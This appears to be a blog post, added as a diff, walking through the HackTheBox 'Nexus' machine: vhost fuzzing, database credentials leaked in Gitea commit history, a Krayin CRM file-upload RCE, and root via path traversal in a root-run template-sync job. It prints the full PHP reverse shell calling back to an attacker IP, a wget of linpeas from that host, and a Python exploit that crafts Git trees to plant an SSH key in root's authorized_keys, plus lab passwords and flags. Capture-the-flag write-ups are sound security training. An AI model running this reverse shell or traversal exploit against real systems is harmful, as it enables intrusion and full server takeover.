@@ -1,0 +1,913 @@
+---
+title: 'Nexus Machine (HackTheBox) — Step-by-Step Walkthrough'
+date: '2026-10-29'
+draft: false
+locked: false
+tags: ['hackthebox', 'linux', 'Machine', 'easy', 'krayin-crm', 'privilege-escalation', 'git']
+summary: 'A walkthrough of the Nexus machine on HackTheBox, covering subdomain enumeration, credential leakage through a Gitea commit history, an authenticated RCE in Krayin CRM, and privilege escalation through an insecure systemd template-sync job.'
+images: ['/static/images/nexus/nexus.png']
+# twitterUrl:
+---
+
+![HackTheBox "You have solved Nexus!" confirmation banner](/static/images/nexus/image%2034.png)
+
+# Overview
+
+Nexus is a solid easy-rated box that chains together credential leakage through version control history, a real-world CRM RCE, and a creative abuse of an automated root-level sync job driven by attacker-controlled Git object paths. The key takeaway is that any process extracting file paths from Git metadata — or any user-controlled source — must treat those paths as untrusted input and strictly validate them before joining them onto a filesystem destination.
+
+| Stage               | Technique                                                                                                                                                             |
+| ------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
+| Recon               | Nmap scan, vhost fuzzing                                                                                                                                              |
+| Initial Information | Gitea commit history leaking CRM database credentials                                                                                                                 |
+| Foothold            | CVE-2026-38526 — Krayin CRM authenticated arbitrary file upload / RCE                                                                                                 |
+| User (jones)        | Password reuse of the leaked database credential                                                                                                                      |
+| Root                | Path traversal in a root-owned `systemd` timer (`template-sync.py`) via a crafted Gitea template repository, used to plant an SSH key in `/root/.ssh/authorized_keys` |
+
+# Machine Information:
+
+<BoxInfoCard
+  htbMachine="Nexus"
+  name="Nexus"
+  iconUrl="/static/images/nexus/nexus.png"
+  retireDate="23 Jun 2026"
+/>
+
+---
+
+# Recon
+
+I started with a standard Nmap service scan against the target.
+
+```bash
+bukhari@ubuntu-VM % nmap -sCV 10.129.234.54
+Starting Nmap 7.98 ( https://nmap.org ) at 2026-10-29 10:26 +0500
+Nmap scan report for 10.129.234.54
+Host is up (0.88s latency).
+Not shown: 998 closed tcp ports (conn-refused)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
+|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
+80/tcp open  http    nginx 1.24.0 (Ubuntu)
+|_http-title: Did not follow redirect to http://nexus.htb/
+|_http-server-header: nginx/1.24.0 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 131.82 seconds
+```
+
+Only two ports are open, so port 80 was the clear starting point. Since the service redirected to `nexus.htb`, I added the host to my `/etc/hosts` file before continuing.
+
+## nexus.htb
+
+Browsing the site manually, I looked for functional flaws and any information disclosure. On the careers page I found a contact email address, `j.matthew@nexus.htb`, which I noted down as it could be useful later in the enumeration process.
+
+![Careers page on nexus.htb exposing the hiring manager's email address](/static/images/nexus/image.png)
+
+## Subdomain Fuzzing
+
+With a single vhost enumerated, I fuzzed for additional subdomains using `ffuf`.
+
+```bash
+bukhari@ubuntu-VM % ffuf -u http://10.129.234.54 -H 'Host: FUZZ.nexus.htb' -w /snap/seclists/current/Discovery/DNS/subdomains-top1million-20000.txt -ac
+
+        /'___\  /'___\           /'___\
+       /\ \__/ /\ \__/  __  __  /\ \__/
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
+         \ \_\   \ \_\  \ \____/  \ \_\
+          \/_/    \/_/   \/___/    \/_/
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://10.129.234.54
+ :: Wordlist         : FUZZ: /snap/seclists/current/Discovery/DNS/subdomains-top1million-20000.txt
+ :: Header           : Host: FUZZ.nexus.htb
+ :: Follow redirects : false
+ :: Calibration      : true
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+________________________________________________
+
+git                     [Status: 200, Size: 14472, Words: 1195, Lines: 242, Duration: 930ms]
+billing                 [Status: 302, Size: 390, Words: 60, Lines: 12, Duration: 1691ms]
+:: Progress: [19966/19966] :: Job [1/1] :: 73 req/sec :: Duration: [0:04:13] :: Errors: 0 ::
+```
+
+This uncovered two additional virtual hosts: `git.nexus.htb` and `billing.nexus.htb`. Both were added to `/etc/hosts` for further enumeration.
+
+## billing.nexus.htb
+
+Navigating to `billing.nexus.htb` revealed a Krayin CRM login page. Without valid credentials at this point, I moved on to the Git instance to see if it exposed anything useful.
+
+![Krayin CRM login page on billing.nexus.htb](/static/images/nexus/image%201.png)
+
+## git.nexus.htb
+
+The Gitea instance had public browsing enabled. Under the Explore tab I found a single repository, `admin/krayin-docker-setup`, and two registered users: `admin` and `jones`.
+
+![Gitea Explore page showing the admin/krayin-docker-setup repository](/static/images/nexus/image%202.png)
+
+![Gitea Explore page showing the two registered users, admin and jones](/static/images/nexus/image%203.png)
+
+The repository contained three files and two commits.
+
+![krayin-docker-setup repository with its file listing and commit count](/static/images/nexus/image%204.png)
+
+Reviewing the commit history, I found that commit `9b817fa4e0` had exposed credentials.
+
+![Commit history of the krayin-docker-setup repository](/static/images/nexus/image%205.png)
+
+The diff showed a change to the application URL and, critically, the removal of a database password from the `.env` file:
+
+```diff
+- APP_URL=http://nexus.htb
++ APP_URL=http://billing.nexus.htb
+...
+- DB_PASSWORD=N27xh!!2ucY04
++ DB_PASSWORD=
+```
+
+Combining this leaked password with the email address I found earlier (`j.matthew@nexus.htb`), I was able to authenticate to `billing.nexus.htb`.
+
+# Gaining a Foothold
+
+## Authenticating to Krayin CRM
+
+Using the credentials `j.matthew@nexus.htb` / `N27xh!!2ucY04`, I successfully logged into the Krayin CRM admin dashboard.
+
+![Krayin CRM dashboard after authenticating](/static/images/nexus/image%206.png)
+
+Checking the account menu, I confirmed the application was running **Krayin CRM v2.2.0**.
+
+![Account dropdown menu showing Krayin version 2.2.0](/static/images/nexus/image%207.png)
+
+### Identifying the Vulnerability
+
+A quick search for known vulnerabilities in this version turned up a critical arbitrary file upload / remote code execution flaw.
+
+![Google search results for Krayin version 2.2.0 vulnerabilities](/static/images/nexus/image%208.png)
+
+- **CVE-2026-38526** — Arbitrary File Upload leading to RCE (CVSS 9.9)
+- **Type:** Unrestricted Upload of File with Dangerous Type (CWE-434)
+- **Endpoint:** `/admin/tinymce/upload`
+- **Details:** An authenticated user can upload a crafted PHP file through the TinyMCE rich-text editor upload component and execute arbitrary code on the underlying server.
+
+I located a public proof-of-concept exploit on GitHub:
+
+```
+https://github.com/sh3llc0d3-0x15/CVE-2026-38526-Exploit
+```
+
+### Setting Up the Exploit
+
+I cloned the repository and installed the required dependencies inside a virtual environment.
+
+```bash
+git clone https://github.com/sh3llc0d3-0x15/CVE-2026-38526-Exploit.git
+cd CVE-2026-38526-Exploit
+source ~/pwn/bin/activate
+pip install -r requirements.txt
+```
+
+The script's usage is straightforward:
+
+```bash
+(pwn) bukhari@ubuntu-VM % python CVE-2026-38526.py --help
+usage: CVE-2026-38526.py [-h] -t TARGET -u USER -p PASSWORD -f FILE [--insecure]
+
+Krayin CRM v2.2.x RCE Exploit
+
+options:
+  -h, --help            show this help message and exit
+  -t, --target TARGET   target url
+  -u, --user USER       admin email
+  -p, --password PASSWORD
+                        admin password
+  -f, --file FILE       payload path
+  --insecure            disable tls certificate verification
+```
+
+Since the exploit required a payload file, I used the classic PHP reverse shell from `pentestmonkey`, updating the `$ip` and `$port` variables to point back to my attacking machine:
+
+```
+https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
+```
+
+```php:php-rce-shell.php
+<?php
+// php-reverse-shell - A Reverse Shell implementation in PHP
+// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
+//
+// This tool may be used for legal purposes only.  Users take full responsibility
+// for any actions performed using this tool.  The author accepts no liability
+// for damage caused by this tool.  If these terms are not acceptable to you, then
+// do not use this tool.
+//
+// In all other respects the GPL version 2 applies:
+//
+// This program is free software; you can redistribute it and/or modify
+// it under the terms of the GNU General Public License version 2 as
+// published by the Free Software Foundation.
+//
+// This program is distributed in the hope that it will be useful,
+// but WITHOUT ANY WARRANTY; without even the implied warranty of
+// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+// GNU General Public License for more details.
+//
+// You should have received a copy of the GNU General Public License along
+// with this program; if not, write to the Free Software Foundation, Inc.,
+// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
+//
+// This tool may be used for legal purposes only.  Users take full responsibility
+// for any actions performed using this tool.  If these terms are not acceptable to
+// you, then do not use this tool.
+//
+// You are encouraged to send comments, improvements or suggestions to
+// me at pentestmonkey@pentestmonkey.net
+//
+// Description
+// -----------
+// This script will make an outbound TCP connection to a hardcoded IP and port.
+// The recipient will be given a shell running as the current user (apache normally).
+//
+// Limitations
+// -----------
+// proc_open and stream_set_blocking require PHP version 4.3+, or 5+
+// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.
+// Some compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely available.
+//
+// Usage
+// -----
+// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.
+
+set_time_limit (0);
+$VERSION = "1.0";
+$ip = '10.10.16.82';  // CHANGE THIS
+$port = 1234;       // CHANGE THIS
+$chunk_size = 1400;
+$write_a = null;
+$error_a = null;
+$shell = 'uname -a; w; id; /bin/sh -i';
+$daemon = 0;
+$debug = 0;
+
+//
+// Daemonise ourself if possible to avoid zombies later
+//
+
+// pcntl_fork is hardly ever available, but will allow us to daemonise
+// our php process and avoid zombies.  Worth a try...
+if (function_exists('pcntl_fork')) {
+	// Fork and have the parent process exit
+	$pid = pcntl_fork();
+
+	if ($pid == -1) {
+		printit("ERROR: Can't fork");
+		exit(1);
+	}
+
+	if ($pid) {
+		exit(0);  // Parent exits
+	}
+
+	// Make the current process a session leader
+	// Will only succeed if we forked
+	if (posix_setsid() == -1) {
+		printit("Error: Can't setsid()");
+		exit(1);
+	}
+
+	$daemon = 1;
+} else {
+	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
+}
+
+// Change to a safe directory
+chdir("/");
+
+// Remove any umask we inherited
+umask(0);
+
+//
+// Do the reverse shell...
+//
+
+// Open reverse connection
+$sock = fsockopen($ip, $port, $errno, $errstr, 30);
+if (!$sock) {
+	printit("$errstr ($errno)");
+	exit(1);
+}
+
+// Spawn shell process
+$descriptorspec = array(
+   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
+   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
+   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
+);
+
+$process = proc_open($shell, $descriptorspec, $pipes);
+
+if (!is_resource($process)) {
+	printit("ERROR: Can't spawn shell");
+	exit(1);
+}
+
+// Set everything to non-blocking
+// Reason: Occsionally reads will block, even though stream_select tells us they won't
+stream_set_blocking($pipes[0], 0);
+stream_set_blocking($pipes[1], 0);
+stream_set_blocking($pipes[2], 0);
+stream_set_blocking($sock, 0);
+
+printit("Successfully opened reverse shell to $ip:$port");
+
+while (1) {
+	// Check for end of TCP connection
+	if (feof($sock)) {
+		printit("ERROR: Shell connection terminated");
+		break;
+	}
+
+	// Check for end of STDOUT
+	if (feof($pipes[1])) {
+		printit("ERROR: Shell process terminated");
+		break;
+	}
+
+	// Wait until a command is end down $sock, or some
+	// command output is available on STDOUT or STDERR
+	$read_a = array($sock, $pipes[1], $pipes[2]);
+	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
+
+	// If we can read from the TCP socket, send
+	// data to process's STDIN
+	if (in_array($sock, $read_a)) {
+		if ($debug) printit("SOCK READ");
+		$input = fread($sock, $chunk_size);
+		if ($debug) printit("SOCK: $input");
+		fwrite($pipes[0], $input);
+	}
+
+	// If we can read from the process's STDOUT
+	// send data down tcp connection
+	if (in_array($pipes[1], $read_a)) {
+		if ($debug) printit("STDOUT READ");
+		$input = fread($pipes[1], $chunk_size);
+		if ($debug) printit("STDOUT: $input");
+		fwrite($sock, $input);
+	}
+
+	// If we can read from the process's STDERR
+	// send data down tcp connection
+	if (in_array($pipes[2], $read_a)) {
+		if ($debug) printit("STDERR READ");
+		$input = fread($pipes[2], $chunk_size);
+		if ($debug) printit("STDERR: $input");
+		fwrite($sock, $input);
+	}
+}
+
+fclose($sock);
+fclose($pipes[0]);
+fclose($pipes[1]);
+fclose($pipes[2]);
+proc_close($process);
+
+// Like print, but does nothing if we've daemonised ourself
+// (I can't figure out how to redirect STDOUT like a proper daemon)
+function printit ($string) {
+	if (!$daemon) {
+		print "$string\n";
+	}
+}
+
+?>
+```
+
+## Shell as www-data
+
+With the payload ready, I ran the exploit against the target:
+
+```bash
+(pwn) bukhari@ubuntu-VM % python3 CVE-2026-38526.py  -t http://billing.nexus.htb -u j.matthew@nexus.htb -p 'N27xh!!2ucY04' -f php-rce-shell.php
+fetching login page...
+submitting credentials...
+uploading php-rce-shell.php...
+
+file uploaded successfully!
+payload path available at: http://billing.nexus.htb/storage/tinymce/7126b7043c1212ad9553f29e71b3ded8.php
+verify execution via web request or listener.
+```
+
+I started a listener and triggered the uploaded payload by requesting the returned path:
+Visiting `http://billing.nexus.htb/storage/tinymce/7126b7043c1212ad9553f29e71b3ded8.php` in the browser fired the shell back to my listener.
+
+```bash
+bukhari@ubuntu-VM % nc -nvlp 1234
+Listening on 0.0.0.0 1234
+Connection received on 10.129.234.54 60180
+Linux nexus 6.8.0-111-generic #111-Ubuntu SMP PREEMPT_DYNAMIC Sat Apr 11 23:16:02 UTC 2026 x86_64 x86_64 x86_64 GNU/Linux
+ 07:42:55 up  2:33,  0 user,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU  WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$
+```
+
+I upgraded the shell to a fully interactive TTY:
+
+```bash
+$ python3 -c 'import pty; pty.spawn("/bin/bash")'
+www-data@nexus:/$
+
+www-data@nexus:/$ ^Z
+zsh: suspended  nc -nvlp 1234
+bukhari@ubuntu-VM % stty raw -echo; fg
+
+[1]  + continued  nc -nvlp 1234
+
+www-data@nexus:/$
+```
+
+# Privilege Escalation: www-data → jones
+
+Enumerating the home directory, I found two folders: `html` and `krayin`.
+
+![www-data home directory listing showing the html and krayin folders](/static/images/nexus/image%209.png)
+
+Inside `krayin`, I listed the full directory contents and found a readable `.env` file.
+
+![Full directory listing of the krayin folder, including the .env file](/static/images/nexus/image%2010.png)
+
+The `.env` file contained a database password:
+
+```
+DB_CONNECTION=mysql
+DB_HOST=127.0.0.1
+DB_PORT=3306
+DB_DATABASE=krayin
+DB_USERNAME=krayin
+DB_PASSWORD=y27xb3ha!!74GbR
+```
+
+I tried this password against the local user `jones`, and it worked:
+
+```bash
+su jones
+```
+
+![Switching to the jones user using the leaked database password](/static/images/nexus/image%2012.png)
+
+I confirmed the credentials also worked over SSH:
+
+```bash
+bukhari@ubuntu-VM % ssh jones@nexus.htb
+The authenticity of host 'nexus.htb (10.129.234.54)' can't be established.
+ED25519 key fingerprint is: SHA256:OZNUeTZ9jastNKKQ1tFXatbeOZzSFg5Dt7nhwhjorR0
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added 'nexus.htb' (ED25519) to the list of known hosts.
+jones@nexus.htb's password:
+Welcome to Ubuntu 24.04.4 LTS (GNU/Linux 6.8.0-111-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/pro
+
+ System information as of Thu Oct 29 08:09:36 AM UTC 2026
+
+  System load:           0.08
+  Usage of /:            67.0% of 6.48GB
+  Memory usage:          20%
+  Swap usage:            0%
+  Processes:             230
+  Users logged in:       0
+  IPv4 address for eth0: 10.129.234.54
+  IPv6 address for eth0: dead:beef::250:56ff:fe95:faa3
+
+ * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
+   just raised the bar for easy, resilient and secure K8s cluster deployment.
+
+   https://ubuntu.com/engage/secure-kubernetes-at-the-edge
+
+Expanded Security Maintenance for Applications is not enabled.
+
+1 update can be applied immediately.
+To see these additional updates run: apt list --upgradable
+
+Enable ESM Apps to receive additional future security updates.
+See https://ubuntu.com/esm or run: sudo pro status
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+jones@nexus:~$
+```
+
+### User Flag
+
+```bash
+cat user.txt
+9994474981412a0ae6bc50528758bebc
+```
+
+# Privilege Escalation: jones → root
+
+## Enumeration
+
+I first checked `sudo` privileges for `jones`, which were explicitly denied.
+
+![sudo -l output denying jones permission to run sudo on nexus](/static/images/nexus/image%2013.png)
+
+I pulled down `linpeas.sh` for a broader sweep of the system.
+
+```bash
+jones@nexus:~$ wget http://10.10.16.82:1234/linpeas.sh
+--2026-10-29 09:16:03--  http://10.10.16.82:1234/linpeas.sh
+Connecting to 10.10.16.82:1234... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 1063041 (1.0M) [application/x-sh]
+Saving to: ‘linpeas.sh’
+
+linpeas.sh                    100%[================================================>]   1.01M   399KB/s    in 2.6s
+
+2026-10-29 09:16:07 (399 KB/s) - ‘linpeas.sh’ saved [1063041/1063041]
+
+jones@nexus:~$ ls
+linpeas.sh  user.txt
+```
+
+### Key Finding: A Root-Owned systemd Timer
+
+Among the active `systemd` timers, `gitea-template-sync.timer` stood out — it had run less than a minute prior.
+
+![linPEAS output listing active systemd timers, including gitea-template-sync.timer](/static/images/nexus/image%2014.png)
+
+```bash
+cat /etc/systemd/system/gitea-template-sync.timer
+```
+
+![Contents of the gitea-template-sync.timer unit file](/static/images/nexus/image%2015.png)
+
+```ini
+[Unit]
+Description=Run Gitea template sync every minute
+
+[Timer]
+OnBootSec=1min
+OnUnitActiveSec=1min
+Unit=gitea-template-sync.service
+
+[Install]
+WantedBy=timers.target
+```
+
+This timer fires every minute and triggers `gitea-template-sync.service`. The corresponding service file revealed it runs as **root**.
+
+```bash
+cat /etc/systemd/system/gitea-template-sync.service
+```
+
+![Contents of the gitea-template-sync.service unit file, showing it runs as root](/static/images/nexus/image%2016.png)
+
+```ini
+[Unit]
+Description=Sync Gitea templates
+After=network-online.target
+
+[Service]
+Type=oneshot
+User=root
+ExecStart=/usr/bin/python3 /etc/gitea/template-sync.py
+TimeoutStartSec=50s
+```
+
+## Analyzing template-sync.py
+
+1. **Loads config** — reads `GITEA_API_TOKEN` from `/etc/gitea/template-sync.conf` or `/opt/forge/app/.env`.
+2. **Queries Gitea's API** for repositories, filtering down to those flagged `template: true`.
+3. **For each template repo**, it runs `git ls-tree -r HEAD` against the bare repository to enumerate every blob, then extracts each file with `git cat-file blob <hash>`, writing the contents to `STAGING_DIR/<owner>/<name>/<filepath>` while preserving the executable bit.
+4. **Logs everything** to `/var/log/template-sync.log`.
+
+```python:template-sync.py
+import os
+import sys
+import json
+import subprocess
+import time
+import urllib.request
+
+GITEA_URL = "http://localhost:3000"
+REPO_ROOT = "/var/lib/gitea/data/gitea-repositories"
+STAGING_DIR = "/home/git/template-staging"
+LOG_FILE = "/var/log/template-sync.log"
+
+def log(msg):
+    ts = time.strftime("%Y-%m-%d %H:%M:%S")
+    line = "[%s] %s" % (ts, msg)
+    print(line, flush=True)
+    try:
+        os.makedirs(os.path.dirname(LOG_FILE), exist_ok=True)
+        with open(LOG_FILE, 'a') as f:
+            f.write(line + '\n')
+    except:
+        pass
+
+def load_config():
+    config = {}
+    for path in ['/etc/gitea/template-sync.conf', '/opt/forge/app/.env']:
+        try:
+            with open(path) as f:
+                for line in f:
+                    line = line.strip()
+                    if line and not line.startswith('#') and '=' in line:
+                        k, v = line.split('=', 1)
+                        config[k.strip()] = v.strip()
+        except:
+            pass
+    return config
+
+def get_token():
+    cfg = load_config()
+    return cfg.get('GITEA_API_TOKEN')
+
+def get_template_repos(token):
+    url = "%s/api/v1/repos/search?limit=50" % GITEA_URL
+    req = urllib.request.Request(url, headers={
+        'Authorization': 'token %s' % token
+    })
+    try:
+        with urllib.request.urlopen(req) as resp:
+            data = json.loads(resp.read())
+            repos = data.get('data', data) if isinstance(data, dict) else data
+            return [r for r in repos if r.get('template', False)]
+    except Exception as e:
+        log("API error: %s" % e)
+        return []
+
+def sync_template(repo_info):
+    owner = repo_info['owner']['login']
+    name = repo_info['name'].lower()
+    bare_path = os.path.join(REPO_ROOT, owner, "%s.git" % name)
+    stage_path = os.path.join(STAGING_DIR, owner, name)
+
+    if not os.path.isdir(bare_path):
+        log("  repo not found: %s" % bare_path)
+        return
+
+    # Read tree entries from the bare repository
+    try:
+        GIT = ['git', '-c', 'safe.directory=*']
+        result = subprocess.run(
+            GIT + ['ls-tree', '-r', 'HEAD'],
+            cwd=bare_path,
+            capture_output=True, text=True, timeout=10
+        )
+        if result.returncode != 0:
+            log("  ls-tree failed: %s" % result.stderr.strip())
+            return
+    except Exception as e:
+        log("  ls-tree error: %s" % e)
+        return
+
+    entries = []
+    for line in result.stdout.strip().split('\n'):
+        if not line:
+            continue
+        parts = line.split('\t', 1)
+        if len(parts) != 2:
+            continue
+        meta, filepath = parts
+        mode, objtype, objhash = meta.split()
+        if objtype == 'blob':
+            entries.append((mode, objhash, filepath))
+
+    if not entries:
+        log("  no files in template")
+        return
+
+    # Extract files to staging directory
+    for mode, objhash, filepath in entries:
+        target = os.path.join(stage_path, filepath)
+        target_dir = os.path.dirname(target)
+
+        try:
+            os.makedirs(target_dir, exist_ok=True)
+            GIT = ['git', '-c', 'safe.directory=*']
+            cat_result = subprocess.run(
+                GIT + ['cat-file', 'blob', objhash],
+                cwd=bare_path,
+                capture_output=True, timeout=10
+            )
+            if cat_result.returncode != 0:
+                continue
+
+            with open(target, 'wb') as f:
+                f.write(cat_result.stdout)
+
+            if mode == '100755':
+                os.chmod(target, 0o755)
+            else:
+                os.chmod(target, 0o644)
+
+            log("  synced: %s" % filepath)
+        except Exception as e:
+            log("  error syncing %s: %s" % (filepath, e))
+
+def main():
+    log("Template sync starting")
+
+    token = get_token()
+    if not token:
+        log("No API token found")
+        sys.exit(1)
+
+    templates = get_template_repos(token)
+    log("Found %d template repo(s)" % len(templates))
+
+    for repo in templates:
+        name = repo['full_name']
+        log("Syncing template: %s" % name)
+        sync_template(repo)
+
+    log("Template sync complete")
+
+if __name__ == '__main__':
+    main()
+```
+
+The script trusts `filepath`, as returned by `git ls-tree`, to be a safe relative path — there is no sanitization or traversal check. Since any authenticated Gitea user can create a repository and flag it as a template, this means **any user controls `filepath`, and therefore controls where root writes files on disk**.
+
+## Building the Exploit
+
+**Step 1 — Create a template repository.**
+
+I logged into `git.nexus.htb` as `jones` using the password recovered earlier (`y27xb3ha!!74GbR`) and created a new repository named `Exploit` owned by `jones`, with the **"Make repository a template"** option enabled.
+
+![Creating a new Gitea repository named Exploit with the template flag enabled](/static/images/nexus/image%2017.png)
+
+**Step 2 — Generate an SSH key pair to plant.**
+
+```bash
+jones@nexus:/tmp$ ssh-keygen -f ./mykey -N ''
+Generating public/private ed25519 key pair.
+Your identification has been saved in ./mykey
+Your public key has been saved in ./mykey.pub
+The key fingerprint is:
+SHA256:tuF9quf+ipwmOblKouVa9z9oB8g9Bb0f3Zh3ox8kbiQ jones@nexus
+The key's randomart image is:
++--[ED25519 256]--+
+|       .         |
+|      . .        |
+|       . . . +   |
+|        o .E+ooo.|
+|   . o .S. .+.+..|
+|    o +o +.  + . |
+|  + o  *o . o . .|
+| = + .B.+o.o   . |
+|o.. .ooB**=o.    |
++----[SHA256]-----+
+```
+
+**Step 3 — Clone the new repository.**
+
+![Cloning the newly created Exploit repository](/static/images/nexus/image%2018.png)
+
+**Step 4 — Commit malicious code using low-level Git plumbing.**
+
+```python:exploit.py
+#!/usr/bin/env python3
+import hashlib,zlib,os,subprocess,sys,time
+
+def write_obj(data,t):
+    h=("%s %d"%(t,len(data))).encode()+b"\x00"
+    s=h+data
+    sha=hashlib.sha1(s).hexdigest()
+    d=os.path.join(".git","objects",sha[:2])
+    os.makedirs(d,exist_ok=True)
+    p=os.path.join(d,sha[2:])
+    if not os.path.exists(p):
+        open(p,"wb").write(zlib.compress(s))
+    return sha
+
+def entry(mode,name,sha):
+    return("%s %s"%(mode,name)).encode()+b"\x00"+bytes.fromhex(sha)
+
+if not os.path.isdir(".git"):
+    print("Run inside git repo");sys.exit(1)
+
+r=subprocess.run(["cat","/tmp/mykey.pub"],capture_output=True,text=True)
+if r.returncode!=0:
+    print("ssh-keygen -f /tmp/mykey -N ''");sys.exit(1)
+key=r.stdout.strip()+"\n"
+
+blob=write_obj(key.encode(),"blob")
+readme=write_obj(b"# Template\n","blob")
+ssh_t=write_obj(entry("100644","authorized_keys",blob),"tree")
+cur=write_obj(entry("40000",".ssh",ssh_t),"tree")
+fir=write_obj(entry("40000","root",cur),"tree")
+for i in range(4):
+    fir=write_obj(entry("40000","..",fir),"tree")
+root=write_obj(entry("100644","README.md",readme)+entry("40000","..",fir),"tree")
+ts=int(time.time())
+c="tree %s\nauthor x <x@x> %d +0000\ncommitter x <x@x> %d +0000\n\ninit\n"%(root,ts,ts)
+sha=write_obj(c.encode(),"commit")
+os.makedirs(os.path.join(".git","refs","heads"),exist_ok=True)
+open(os.path.join(".git","refs","heads","main"),"w").write(sha+"\n")
+print("Done: "+sha)
+```
+
+The crafted tree places the public key at `authorized_keys` using a relative path traversal of the form:
+
+```
+../../../../root/.ssh/authorized_keys
+```
+
+The script constructs the blob, builds the nested tree objects, writes a commit pointing at the top-level tree, and updates `refs/heads/main` accordingly — all using raw Git object construction (`hashlib.sha1`, `zlib.compress`) so that `git ls-tree` on the server returns the traversal path verbatim.
+
+**Step 5 — Force-push the crafted commit.**
+
+```bash
+jones@nexus:/tmp/Exploit$ python3 ../exploit.py
+Done: 141e0dbbe22578e34b6362f71a0ecc52cc90521a
+jones@nexus:/tmp/Exploit$ git push -u origin main --force
+warning: unable to access '../../../../../root/.gitattributes': Permission denied
+warning: unable to access '../../../../../root/.ssh/.gitattributes': Permission denied
+Enumerating objects: 11, done.
+Counting objects: 100% (11/11), done.
+Delta compression using up to 2 threads
+Compressing objects: 100% (3/3), done.
+Writing objects: 100% (11/11), 610 bytes | 610.00 KiB/s, done.
+Total 11 (delta 0), reused 0 (delta 0), pack-reused 0
+remote: . Processing 1 references
+remote: Processed 1 references in total
+To http://localhost:3000/jones/Exploit.git
+ + b3e99a3...141e0db main -> main (forced update)
+branch 'main' set up to track 'origin/main'.
+jones@nexus:/tmp/Exploit$
+
+```
+
+Browsing the repository on Gitea confirmed the crafted path traversal structure was present in the tree.
+
+![Gitea repository view showing the crafted ../../../../root/.ssh traversal path in the tree](/static/images/nexus/image%2019.png)
+
+## Root Shell
+
+With the key planted, I authenticated over SSH directly as root:
+
+```bash
+bukhari@ubuntu-VM % nano key
+bukhari@ubuntu-VM % chmod 600 key
+bukhari@ubuntu-VM % ssh -i key root@nexus.htb
+Welcome to Ubuntu 24.04.4 LTS (GNU/Linux 6.8.0-111-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/pro
+
+ System information as of Thu Oct 29 10:48:39 AM UTC 2026
+
+  System load:           0.08
+  Usage of /:            68.2% of 6.48GB
+  Memory usage:          29%
+  Swap usage:            0%
+  Processes:             243
+  Users logged in:       1
+  IPv4 address for eth0: 10.129.234.54
+  IPv6 address for eth0: dead:beef::250:56ff:fe95:faa3
+
+ * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
+   just raised the bar for easy, resilient and secure K8s cluster deployment.
+
+   https://ubuntu.com/engage/secure-kubernetes-at-the-edge
+
+Expanded Security Maintenance for Applications is not enabled.
+
+1 update can be applied immediately.
+To see these additional updates run: apt list --upgradable
+
+Enable ESM Apps to receive additional future security updates.
+See https://ubuntu.com/esm or run: sudo pro status
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+root@nexus:~#
+```
+
+## Root Flag
+
+```bash
+cat root.txt
+4a5e534e3dd2d1d2412b486e01cb4981
+```
